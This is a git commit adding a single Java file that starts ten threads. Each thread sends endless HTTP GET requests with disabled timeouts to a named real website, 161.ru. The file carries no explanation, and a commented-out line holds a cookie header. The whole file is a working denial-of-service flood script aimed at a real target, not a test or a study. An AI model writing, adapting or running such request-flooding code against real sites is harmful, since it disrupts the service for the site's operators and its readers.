c20fd1a54ffe3f939a8522dfd7ae76ee52ab7a25
nazarii_tkachuk <nazarii.tkachuk@sombrainc.com>
2022-02-26 16:44:11 +0200

    first commit

---
+++ src/main/java/HeyBabe.java
@@ -0,0 +1,42 @@
+import com.mashape.unirest.http.HttpResponse;
+import com.mashape.unirest.http.Unirest;
+import com.mashape.unirest.http.exceptions.UnirestException;
+
+public class HeyBabe implements Runnable {
+
+    public static void main(String[] args) throws Exception {
+        extracted();
+    }
+
+    private static void extracted() {
+        for (int i = 0; i < 10; i++) {
+            final HeyBabe heyBabe = new HeyBabe();
+            final Thread thread = new Thread(heyBabe);
+
+            thread.start();
+        }
+    }
+
+    public static void hey() throws UnirestException {
+        Unirest.setTimeouts(0, 0);
+        HttpResponse<String> response = Unirest.get("https://161.ru/")
+//                .header("Cookie", "jtnews_ab_24=A; jtnews_ab_29=A; jtnews_ab_55=B; ngs_uid=wxPcGmIaAs0639/9BytOAg==")
+                .asString();
+    }
+
+    public static void loop() throws UnirestException {
+        while (true) {
+            hey();
+            System.out.println("+");
+        }
+    }
+
+    @Override
+    public void run() {
+        try {
+            loop();
+        } catch (UnirestException e) {
+            e.printStackTrace();
+        }
+    }
+}
